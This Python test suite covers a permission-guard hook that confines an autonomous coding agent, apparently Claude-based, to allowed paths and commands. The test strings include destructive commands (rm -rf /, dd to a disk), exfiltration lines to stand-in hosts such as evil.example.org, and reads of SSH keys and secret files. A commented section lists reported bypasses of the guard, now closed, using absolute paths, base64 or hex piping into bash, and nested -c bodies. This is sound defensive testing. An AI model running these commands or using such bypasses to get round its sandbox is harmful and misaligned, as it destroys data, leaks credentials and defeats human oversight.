"""hooks/test_guard.py — >=25 cases for hooks/guard.py. Run: python3 -m unittest hooks.test_guard
or: python3 hooks/test_guard.py
"""
import json
import os
import subprocess
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import guard  # noqa: E402

GUARD_PY = os.path.join(os.path.dirname(os.path.abspath(__file__)), "guard.py")


class GuardTestBase(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = os.path.join(self.tmp.name, "repo")
        self.home = os.path.join(self.tmp.name, "home")
        self.vault = os.path.join(self.tmp.name, "vault")
        self.project_dir = os.path.join(self.root, "state", "current", "testproj")

        for d in (
            self.root,
            os.path.join(self.root, "bench", "tasks"),
            os.path.join(self.root, "hooks"),
            os.path.join(self.root, "loop"),
            os.path.join(self.root, "state"),
            self.home,
            os.path.join(self.home, ".claude"),
            os.path.join(self.home, "bin"),
            os.path.join(self.home, ".ssh"),
            os.path.join(self.vault, "AUTOGOD"),
            os.path.join(self.vault, "Journal"),
            self.project_dir,
        ):
            os.makedirs(d, exist_ok=True)

        with open(os.path.join(self.root, "GATE.md"), "w") as f:
            f.write("gate\n")
        with open(os.path.join(self.root, "loop", "CLAUDE.md"), "w") as f:
            f.write("rules\n")

        self.env = {
            "AUTOGOD_ROOT": self.root,
            "HOME": self.home,
            "VAULT": self.vault,
            "AUTOGOD_PROJECT_DIR": self.project_dir,
            "AUTOGOD_PHASE": "build",
        }
        self._old_environ = dict(os.environ)
        os.environ.update(self.env)
        for k in ("AUTOGOD_ALLOWED_ROOTS", "AUTOGOD_STATE_DIR"):
            os.environ.pop(k, None)

    def tearDown(self):
        os.environ.clear()
        os.environ.update(self._old_environ)
        self.tmp.cleanup()

    def cfg(self):
        return guard.load_config()

    def decide(self, tool_name, tool_input, cwd=None):
        payload = {"tool_name": tool_name, "tool_input": tool_input, "cwd": cwd or self.project_dir}
        return guard.decide(payload, self.cfg())

    def assertDenied(self, tool_name, tool_input, cwd=None, msg=None):
        deny, reason = self.decide(tool_name, tool_input, cwd)
        self.assertTrue(deny, msg or ("expected deny for %r" % (tool_input,)))
        self.assertTrue(reason)
        return reason

    def assertAllowed(self, tool_name, tool_input, cwd=None, msg=None):
        deny, reason = self.decide(tool_name, tool_input, cwd)
        self.assertFalse(deny, msg or ("expected allow, got deny: %s" % reason))


# ---------------------------------------------------------------------------
# Write / Edit path rules
# ---------------------------------------------------------------------------


class TestWritePaths(GuardTestBase):
    def test_write_inside_project_dir_allowed(self):
        self.assertAllowed("Write", {"file_path": os.path.join(self.project_dir, "run.sh")})

    def test_write_inside_vault_autogod_allowed(self):
        self.assertAllowed(
            "Write", {"file_path": os.path.join(self.vault, "AUTOGOD", "note.md")}
        )

    def test_write_outside_roots_denied(self):
        self.assertDenied("Write", {"file_path": os.path.join(self.home, "somewhere.txt")})

    def test_write_gate_md_denied(self):
        self.assertDenied("Write", {"file_path": os.path.join(self.root, "GATE.md")})

    def test_write_bench_tasks_denied(self):
        self.assertDenied(
            "Write", {"file_path": os.path.join(self.root, "bench", "tasks", "x", "TASK.md")}
        )

    def test_write_hooks_denied(self):
        self.assertDenied("Write", {"file_path": os.path.join(self.root, "hooks", "guard.py")})

    def test_write_loop_claude_md_denied(self):
        self.assertDenied("Write", {"file_path": os.path.join(self.root, "loop", "CLAUDE.md")})

    def test_write_project_settings_json_denied(self):
        self.assertDenied(
            "Edit", {"file_path": os.path.join(self.project_dir, ".claude", "settings.json")}
        )

    def test_write_home_claude_denied(self):
        self.assertDenied("Write", {"file_path": os.path.join(self.home, ".claude", "x.json")})

    def test_write_home_bin_denied(self):
        self.assertDenied("Write", {"file_path": os.path.join(self.home, "bin", "foo-probe")})

    def test_symlink_escape_denied(self):
        # A symlink *inside* the project dir that points outside it must not
        # let a write through: guard.py resolves realpath before checking.
        outside_target = os.path.join(self.home, "escaped.txt")
        with open(outside_target, "w") as f:
            f.write("x")
        link = os.path.join(self.project_dir, "sneaky.txt")
        os.symlink(outside_target, link)
        self.assertDenied("Write", {"file_path": link})

    def test_symlink_inside_allowed_root_ok(self):
        target = os.path.join(self.project_dir, "real.txt")
        with open(target, "w") as f:
            f.write("x")
        link = os.path.join(self.project_dir, "alias.txt")
        os.symlink(target, link)
        self.assertAllowed("Write", {"file_path": link})

    def test_relative_path_resolved_against_cwd(self):
        self.assertAllowed("Write", {"file_path": "out.txt"}, cwd=self.project_dir)
        self.assertDenied("Write", {"file_path": "out.txt"}, cwd=self.home)

    def test_no_path_in_input_denied(self):
        self.assertDenied("Write", {})


# ---------------------------------------------------------------------------
# Read / Grep / Glob rules
# ---------------------------------------------------------------------------


class TestReadPaths(GuardTestBase):
    def test_read_under_home_allowed(self):
        self.assertAllowed("Read", {"file_path": os.path.join(self.home, "notes.txt")})

    def test_read_under_vault_allowed(self):
        self.assertAllowed("Read", {"file_path": os.path.join(self.vault, "Journal", "2026-09-08.md")})

    def test_read_ssh_denied(self):
        self.assertDenied("Read", {"file_path": os.path.join(self.home, ".ssh", "id_rsa")})

    def test_read_notify_env_denied(self):
        self.assertDenied("Read", {"file_path": os.path.join(self.home, ".claude", "notify.env")})

    def test_read_dotenv_denied(self):
        self.assertDenied("Read", {"file_path": os.path.join(self.home, "project", ".env")})

    def test_read_token_named_file_denied(self):
        self.assertDenied("Read", {"file_path": os.path.join(self.home, "api_token.json")})

    def test_read_secret_named_file_denied(self):
        self.assertDenied("Read", {"file_path": os.path.join(self.home, "secrets.yaml")})

    def test_read_pem_denied(self):
        self.assertDenied("Read", {"file_path": os.path.join(self.home, "key.pem")})

    def test_read_id_prefixed_denied(self):
        self.assertDenied("Read", {"file_path": os.path.join(self.home, ".ssh2", "id_ed25519")})

    def test_grep_path_outside_home_and_vault_denied(self):
        self.assertDenied("Grep", {"pattern": "foo", "path": "/etc/passwd"})

    def test_grep_without_path_allowed(self):
        # only a pattern, no path to check -> nothing to deny
        self.assertAllowed("Grep", {"pattern": "foo"})

    def test_glob_outside_denied(self):
        self.assertDenied("Glob", {"pattern": "*.py", "path": "/root"})


# ---------------------------------------------------------------------------
# Bash rules
# ---------------------------------------------------------------------------


class TestBash(GuardTestBase):
    def test_plain_command_allowed(self):
        self.assertAllowed("Bash", {"command": "echo hello"})

    def test_sudo_denied(self):
        self.assertDenied("Bash", {"command": "sudo apt install foo"})

    def test_systemctl_denied(self):
        self.assertDenied("Bash", {"command": "systemctl restart autogod-v2"})

    def test_git_push_denied(self):
        self.assertDenied("Bash", {"command": "git push origin main"})

    def test_git_status_allowed(self):
        self.assertAllowed("Bash", {"command": "git status"})

    def test_ssh_denied(self):
        self.assertDenied("Bash", {"command": "ssh thebeast uptime"})

    def test_scp_denied(self):
        self.assertDenied("Bash", {"command": "scp foo.txt thebeast:/tmp/"})

    def test_rsync_remote_denied(self):
        self.assertDenied("Bash", {"command": "rsync -av foo user@thebeast:/data/"})

    def test_rsync_local_allowed(self):
        self.assertAllowed(
            "Bash",
            {"command": "rsync -av %s/a %s/b" % (self.project_dir, self.project_dir)},
        )

    def test_rm_rf_root_denied(self):
        self.assertDenied("Bash", {"command": "rm -rf /"})

    def test_rm_rf_project_dir_allowed(self):
        self.assertAllowed("Bash", {"command": "rm -rf %s/tmp" % self.project_dir})

    def test_dev_sd_write_denied(self):
        self.assertDenied("Bash", {"command": "dd if=/dev/zero of=/dev/sda"})

    def test_nvidia_smi_reset_denied(self):
        self.assertDenied("Bash", {"command": "nvidia-smi -r"})

    def test_kill_minus1_denied(self):
        self.assertDenied("Bash", {"command": "kill -9 -1"})

    def test_crontab_denied(self):
        self.assertDenied("Bash", {"command": "crontab -l"})

    def test_chmod_setuid_denied(self):
        self.assertDenied("Bash", {"command": "chmod u+s /usr/bin/foo"})

    def test_chmod_normal_allowed(self):
        self.assertAllowed("Bash", {"command": "chmod 644 %s/run.sh" % self.project_dir})

    def test_curl_localhost_ip_allowed(self):
        self.assertAllowed("Bash", {"command": "curl http://127.0.0.1:11466/health"})

    def test_curl_outside_host_denied(self):
        self.assertDenied("Bash", {"command": "curl https://example.com/exfiltrate"})

    def test_wget_outside_host_denied(self):
        self.assertDenied("Bash", {"command": "wget http://evil.example.org/payload"})

    def test_redirect_inside_project_allowed(self):
        self.assertAllowed(
            "Bash", {"command": "echo hi > %s/out.txt" % self.project_dir}
        )

    def test_redirect_outside_roots_denied(self):
        self.assertDenied("Bash", {"command": "echo hi > %s/leak.txt" % self.home})

    def test_append_redirect_outside_roots_denied(self):
        self.assertDenied("Bash", {"command": "echo hi >> /etc/motd"})

    def test_redirect_to_dev_null_allowed(self):
        self.assertAllowed("Bash", {"command": "make test > /dev/null 2>&1"})

    def test_tee_outside_roots_denied(self):
        self.assertDenied("Bash", {"command": "echo hi | tee %s/out.txt" % self.home})

    def test_tee_inside_project_allowed(self):
        self.assertAllowed(
            "Bash", {"command": "echo hi | tee %s/out.txt" % self.project_dir}
        )

    def test_cd_outside_then_write_denied(self):
        self.assertDenied(
            "Bash", {"command": "cd %s && echo hi > pwned.txt" % self.home}
        )

    def test_cd_inside_project_then_write_allowed(self):
        self.assertAllowed(
            "Bash", {"command": "cd %s && echo hi > pwned.txt" % self.project_dir}
        )

    def test_python_c_body_with_sudo_denied(self):
        self.assertDenied(
            "Bash",
            {"command": "python3 -c \"import os; os.system('sudo rm -rf /')\""},
        )

    def test_bash_c_body_with_bad_redirect_denied(self):
        # the -c body is itself a shell command string; guard.py recurses into
        # any nested, whitespace-containing token and re-applies every rule,
        # so a redirect hidden inside `bash -c "..."` is still caught.
        self.assertDenied(
            "Bash",
            {"command": "bash -c 'echo hi > %s/leak.txt'" % self.home},
        )

    def test_bash_c_body_with_curl_outside_denied(self):
        self.assertDenied("Bash", {"command": "bash -c 'curl https://evil.example.com'"})

    def test_python_c_body_harmless_allowed(self):
        self.assertAllowed("Bash", {"command": "python3 -c \"print(1+1)\""})

    def test_no_command_denied(self):
        self.assertDenied("Bash", {})

    # --- coordinator-reported bypasses (2026-09-08 review), now closed ---

    def test_sudo_via_absolute_path_denied(self):
        # bypass 1: basename of every token, not the literal token
        self.assertDenied("Bash", {"command": "/usr/bin/sudo ls"})

    def test_ssh_via_absolute_path_denied(self):
        self.assertDenied("Bash", {"command": "/usr/bin/ssh nitro ls"})

    def test_base64_decode_piped_to_bash_denied(self):
        # bypass 2: base64 -d, and piping into an interpreter
        self.assertDenied(
            "Bash", {"command": "echo c3VkbyBscw== | base64 -d | bash"}
        )

    def test_pipe_to_python_denied(self):
        self.assertDenied("Bash", {"command": "echo import os | python3"})

    def test_pipe_via_xargs_to_sh_denied(self):
        self.assertDenied("Bash", {"command": "echo hi | xargs -I{} sh -c '{}'"})

    def test_xxd_reverse_denied(self):
        self.assertDenied("Bash", {"command": "echo 7375646f | xxd -r -p | bash"})

    def test_printf_hex_escape_denied(self):
        self.assertDenied("Bash", {"command": "printf '\\x73\\x75\\x64\\x6f' | bash"})

    def test_bare_eval_denied(self):
        self.assertDenied("Bash", {"command": "eval \"$(cat foo.sh)\""})

    def test_source_file_outside_roots_denied(self):
        self.assertDenied("Bash", {"command": "source %s/evil.sh" % self.home})

    def test_dot_source_file_outside_roots_denied(self):
        self.assertDenied("Bash", {"command": ". %s/evil.sh" % self.home})

    def test_source_file_inside_project_allowed(self):
        self.assertAllowed(
            "Bash", {"command": "source %s/env.sh" % self.project_dir}
        )

    def test_cp_destination_outside_roots_denied(self):
        # bypass 3: destination-argument check for file-moving commands
        self.assertDenied(
            "Bash", {"command": "cp run.sh %s/bin/evil" % self.home}
        )

    def test_mv_destination_outside_project_vault_denied(self):
        # vault itself is allowed only under vault/AUTOGOD, not the whole vault
        self.assertDenied(
            "Bash", {"command": "mv a.md %s/Journal/a.md" % self.vault}
        )

    def test_cp_inside_project_allowed(self):
        self.assertAllowed(
            "Bash",
            {"command": "cp a b"},
            cwd=self.project_dir,
        )

    def test_mv_inside_vault_autogod_allowed(self):
        self.assertAllowed(
            "Bash",
            {"command": "mv a.md %s" % os.path.join(self.vault, "AUTOGOD", "a.md")},
        )

    def test_git_clone_destination_outside_roots_denied(self):
        self.assertDenied(
            "Bash", {"command": "git clone https://example.com/x.git %s/x" % self.home}
        )

    def test_tar_extract_outside_roots_denied(self):
        self.assertDenied(
            "Bash", {"command": "tar -xf archive.tar -C %s" % self.home}
        )

    def test_dd_of_outside_roots_denied(self):
        self.assertDenied(
            "Bash", {"command": "dd if=payload of=%s/authorized_keys" % self.home}
        )

    def test_python_c_quoted_ssh_list_literal_denied(self):
        # bypass 4: quoted string literals inside -c bodies lose their word
        # boundaries when shlex re-tokenizes ["ssh","nitro","ls"] into one
        # blob; the raw-text word scan must still catch "ssh".
        self.assertDenied(
            "Bash",
            {
                "command": (
                    'python3 -c "import subprocess;'
                    'subprocess.run([\\"ssh\\",\\"nitro\\",\\"ls\\"])"'
                )
            },
        )

    def test_python_c_print_allowed(self):
        self.assertAllowed("Bash", {"command": 'python3 -c "print(1)"'})

    def test_pipe_to_grep_allowed(self):
        self.assertAllowed("Bash", {"command": "echo hi | grep h"})


# ---------------------------------------------------------------------------
# WebSearch / WebFetch phase gating
# ---------------------------------------------------------------------------


class TestWebPhaseGating(GuardTestBase):
    def test_websearch_denied_in_look_phase(self):
        os.environ["AUTOGOD_PHASE"] = "look"
        self.assertDenied("WebSearch", {"query": "anything"})

    def test_websearch_denied_in_pick_phase(self):
        os.environ["AUTOGOD_PHASE"] = "pick"
        self.assertDenied("WebSearch", {"query": "anything"})

    def test_websearch_allowed_in_build_phase(self):
        os.environ["AUTOGOD_PHASE"] = "build"
        self.assertAllowed("WebSearch", {"query": "anything"})

    def test_webfetch_denied_outside_build(self):
        os.environ["AUTOGOD_PHASE"] = "look"
        self.assertDenied("WebFetch", {"url": "https://example.com"})

    def test_webfetch_allowed_in_build(self):
        os.environ["AUTOGOD_PHASE"] = "build"
        self.assertAllowed("WebFetch", {"url": "https://example.com"})


# ---------------------------------------------------------------------------
# Unknown tools, fail-closed on malformed stdin, end-to-end via subprocess
# ---------------------------------------------------------------------------


class TestMiscAndProcess(GuardTestBase):
    def test_unknown_tool_allowed_by_default(self):
        self.assertAllowed("TodoWrite", {"todos": []})

    def _run_guard(self, stdin_text, extra_env=None):
        env = dict(os.environ)
        if extra_env:
            env.update(extra_env)
        proc = subprocess.run(
            [sys.executable, GUARD_PY],
            input=stdin_text,
            capture_output=True,
            text=True,
            env=env,
            timeout=10,
        )
        return proc

    def test_malformed_json_fails_closed(self):
        proc = self._run_guard("not valid json {{{")
        self.assertEqual(proc.returncode, 0)
        out = json.loads(proc.stdout)
        self.assertEqual(
            out["hookSpecificOutput"]["permissionDecision"], "deny"
        )
        self.assertIn("guard exception", out["hookSpecificOutput"]["permissionDecisionReason"])

    def test_empty_stdin_fails_closed(self):
        proc = self._run_guard("")
        self.assertEqual(proc.returncode, 0)
        out = json.loads(proc.stdout)
        self.assertEqual(out["hookSpecificOutput"]["permissionDecision"], "deny")

    def test_non_object_json_fails_closed(self):
        proc = self._run_guard("[1, 2, 3]")
        self.assertEqual(proc.returncode, 0)
        out = json.loads(proc.stdout)
        self.assertEqual(out["hookSpecificOutput"]["permissionDecision"], "deny")

    def test_valid_allow_prints_nothing(self):
        payload = json.dumps(
            {
                "tool_name": "Bash",
                "tool_input": {"command": "echo hi"},
                "cwd": self.project_dir,
            }
        )
        proc = self._run_guard(payload)
        self.assertEqual(proc.returncode, 0)
        self.assertEqual(proc.stdout.strip(), "")

    def test_valid_deny_writes_guard_log(self):
        payload = json.dumps(
            {
                "tool_name": "Bash",
                "tool_input": {"command": "sudo rm -rf /"},
                "cwd": self.project_dir,
            }
        )
        proc = self._run_guard(payload)
        self.assertEqual(proc.returncode, 0)
        out = json.loads(proc.stdout)
        self.assertEqual(out["hookSpecificOutput"]["permissionDecision"], "deny")
        log_path = os.path.join(self.root, "state", "guard.log")
        self.assertTrue(os.path.exists(log_path))
        with open(log_path) as f:
            content = f.read()
        self.assertIn("Bash", content)


if __name__ == "__main__":
    unittest.main()
